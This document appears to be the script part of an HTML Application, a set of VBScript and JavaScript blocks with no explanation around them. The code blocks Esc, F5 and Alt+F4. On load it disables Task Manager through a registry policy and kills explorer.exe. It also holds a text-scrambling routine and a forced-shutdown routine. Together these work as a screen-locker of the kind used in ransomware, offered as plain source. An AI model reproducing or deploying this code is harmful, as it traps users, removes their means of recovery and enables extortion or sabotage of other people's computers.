<SCRIPT LANGUAGE="VBScript">
 Function Document_onKeyDown()

    Dim alt
    alt = window.event.altKey
    Select Case window.event.keyCode
        Case 27,116
            window.event.keyCode = 0
            window.event.cancelBubble = true
            Document_onKeyDown = False
		Case 115
            If alt Then
                window.event.keyCode = 0
                window.event.cancelBubble = true
                Document_onKeyDown = False
            End If
        Case Else
            Document_onKeyDown = True
    End Select

End Function 

</SCRIPT>

<SCRIPT LANGUAGE="VBScript">
ON ERROR RESUME NEXT
DIM ObjFSO,SLREG,WinREG,WshShell
SET ObjFSO=CreateObject("Scripting.FileSystemObject")
WinREG="Software\Microsoft\Windows\CurrentVersion\Policies\System"
SET WshShell=CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\"&WinREG&"\DisableTaskMgr",1,"REG_DWORD"
WshShell.Run("TASKKILL /F /IM explorer.exe"),vbHide

FUNCTION SCRAMBLE(TEXT,NUM)
Dim C,IntRand,ByteASC
RND(-1)
RANDOMIZE ABS(NUM)
FOR C=1 TO LEN(TEXT)
ByteASC=ASC(MID(TEXT,C))
IF ByteASC=126 then ByteASC=34
IntRand = ByteASC+((INT(RND(1)*160)-80)*SGN(NUM))
IF intRand<=31 THEN
IntRand=125-(31-IntRand)
ElseIf intRand>=126 Then
IntRand=32+(IntRand-126)
END IF
IF IntRand=34 THEN IntRand=126
Scramble=Scramble&CHR(intRand)
NEXT
END FUNCTION

FUNCTION RegExists(VALUE)
ON ERROR RESUME NEXT
DIM VAL
VAL=CreateObject("WScript.Shell").RegRead(VALUE)
IF (VAL)="" THEN
RegExists=FALSE
ELSE
RegExists=TRUE
END IF
END FUNCTION

SUB SHUTDOWN
WshShell.RegWrite "HKCU\"&WinREG&"\DisableTaskMgr",0,"REG_DWORD"
WshShell.Run("SHUTDOWN -S -F -T 0")
END SUB
</SCRIPT>

<SCRIPT LANGUAGE="JavaScript"> 
function document.onkeydown() {  
 var alt=window.event.altKey; 
 if (event.keyCode==116 || event.keyCode==27 || alt && event.keyCode==115) { 
 event.keyCode=0; 
 event.cancelBubble=true; 
 return false; 
 } 
 } 
</SCRIPT> 

